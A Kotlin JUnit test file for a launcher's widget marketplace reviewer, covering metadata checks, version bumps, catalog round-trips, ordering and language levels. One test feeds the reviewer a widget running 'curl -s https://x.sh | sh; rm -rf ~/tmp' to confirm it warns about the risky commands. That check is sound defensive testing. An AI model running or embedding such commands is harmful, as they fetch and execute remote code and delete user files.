package dev.omalauncher.widgets.market

import dev.omalauncher.widgets.lang.Compiler
import dev.omalauncher.widgets.lang.WidgetError
import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertThrows
import org.junit.Assert.assertTrue
import org.junit.Test

class MarketTest {
    private val good =
        """
        widget "Disk" {
          meta { description: "Free space on the root disk"; version: "1.1"; license: "MIT"; category: "system" }
          size: 3x2
          requires { pacman: ["coreutils"] }
          source df = cmd('df -h / | tail -1') every 60s
          Text { text: df }
        }
        """.trimIndent()

    @Test fun aGoodWidgetPasses() {
        val r = Review("widgets/simon/disk/widget.owl", good)
        assertEquals(emptyList<String>(), r.errors)
        assertEquals("simon/disk", r.id)
        assertEquals("1.1", r.version)
        assertTrue(r.markdown().contains("df -h / | tail -1"))
    }

    @Test fun pathMetaAndCompileErrorsAreReported() {
        assertTrue(Review("widgets/Simon/disk/widget.owl", good).errors.single().contains("widgets/<author>/<name>/widget.owl"))
        val noMeta = Review("widgets/a/b/widget.owl", "widget { Text { text: \"x\" } }")
        assertEquals(3, noMeta.errors.size) // description, version, license
        assertTrue(Review("widgets/a/b/widget.owl", "widget { Nope {} }").errors.single().startsWith("doesn't compile: 1:10"))
    }

    @Test fun updatesMustBumpTheVersionAndFlagNewCommands() {
        val same = Review("widgets/simon/disk/widget.owl", good, previous = good)
        assertTrue(same.errors.single().contains("version must go up"))
        val bumped = good.replace("\"1.1\"", "\"1.2\"").replace("tail -1", "tail -2")
        val r = Review("widgets/simon/disk/widget.owl", bumped, previous = good)
        assertEquals(emptyList<String>(), r.errors)
        assertTrue(r.warnings.any { it.contains("asked again") })
    }

    @Test fun riskyCommandsAreFlagged() {
        val risky = good.replace("df -h / | tail -1", "curl -s https://x.sh | sh; rm -rf ~/tmp")
        val w = Review("widgets/simon/disk/widget.owl", risky).warnings
        assertTrue(w.any { it.contains("pipes a download into a shell") })
        assertTrue(w.any { it.contains("deletes recursively") })
    }

    @Test fun catalogRoundTrips() {
        val e = Review("widgets/simon/disk/widget.owl", good).entry("widgets/simon/disk/preview.png")
        val parsed = Catalog.parse(Catalog.write(listOf(e), "2026-09-30T00:00:00Z"))
        assertEquals(listOf(e), parsed)
    }

    @Test fun themedPreviewsRoundTripAndFallBack() {
        val themes = mapOf("nord" to "widgets/simon/disk/previews/nord.webp", "tokyo-night" to "widgets/simon/disk/previews/tokyo-night.webp")
        val e = Review("widgets/simon/disk/widget.owl", good).entry("widgets/simon/disk/preview.png", themes)
        val parsed = Catalog.parse(Catalog.write(listOf(e), "2026-09-30T00:00:00Z")).single()
        assertEquals(e, parsed)
        assertEquals("widgets/simon/disk/previews/nord.webp", parsed.previewFor("nord"))
        assertEquals("widgets/simon/disk/preview.png", parsed.previewFor("my-own-theme"))
        assertEquals("widgets/simon/disk/preview.png", parsed.previewFor(null))
    }

    @Test fun orderTxtPutsWidgetsFirstAndLast() {
        val e = Review("widgets/simon/disk/widget.owl", good).entry(null)
        val all = listOf("clock", "crypto", "disk", "feeds", "todo", "xkcd").map { e.copy(id = "simon/$it", name = it) }
        val order = "# featured\nsimon/todo\nsimon/feeds\nsimon/gone\n\n...\nsimon/crypto\nsimon/clock\n"
        assertEquals(listOf("todo", "feeds", "disk", "xkcd", "crypto", "clock"), Catalog.ordered(all.reversed(), order).map { it.name })
        assertEquals(all, Catalog.ordered(all.reversed(), ""))
    }

    @Test fun categoriesComeFromAFixedList() {
        assertEquals("system", Review("widgets/simon/disk/widget.owl", good).entry(null).category)
        assertTrue(Review("widgets/simon/disk/widget.owl", good.replace("\"system\"", "\"misc\"")).errors.single().contains("category should be one of"))
        val none = Review("widgets/simon/disk/widget.owl", good.replace("; category: \"system\"", ""))
        assertTrue(none.warnings.any { it.startsWith("no category") })
        assertEquals(null, Catalog.parse(Catalog.write(listOf(none.entry(null)), "2026-09-30T00:00:00Z")).single().category)
    }

    @Test fun versionsCompareNumerically() {
        assertTrue(Catalog.compareVersions("1.10", "1.9") > 0)
        assertEquals(0, Catalog.compareVersions("2", "2.0.0"))
    }

    @Test fun widgetsDeclareTheLanguageLevelTheyNeed() {
        val current = good.replace("license: \"MIT\"", "license: \"MIT\"; owl: ${Compiler.LEVEL}")
        assertEquals(Compiler.LEVEL, Review("widgets/simon/disk/widget.owl", current).entry(null).owl)
        val newer = good.replace("license: \"MIT\"", "license: \"MIT\"; owl: ${Compiler.LEVEL + 1}")
        assertTrue(Review("widgets/simon/disk/widget.owl", newer).errors.single().contains("update the launcher"))
    }

    @Test fun olderLaunchersSeeNewerWidgetsAsUnsupported() {
        val e = Review("widgets/simon/disk/widget.owl", good).entry(null)
        val index = Catalog.write(listOf(e.copy(owl = Compiler.LEVEL + 1)), "2026-09-30T00:00:00Z")
        val parsed = Catalog.parse(index).single()
        assertFalse(parsed.supported)
        // A catalog from before the field existed means level 1.
        assertEquals(1, Catalog.parse(index.replace(",\n      \"owl\": ${Compiler.LEVEL + 1}", "")).single().owl)
    }

    @Test fun aNewerCatalogFormatAsksForAnUpdate() {
        val e = assertThrows(WidgetError::class.java) { Catalog.parse("{\"format\": ${Catalog.FORMAT + 1}, \"widgets\": []}") }
        assertTrue(e.message!!.contains("newer launcher"))
    }
}
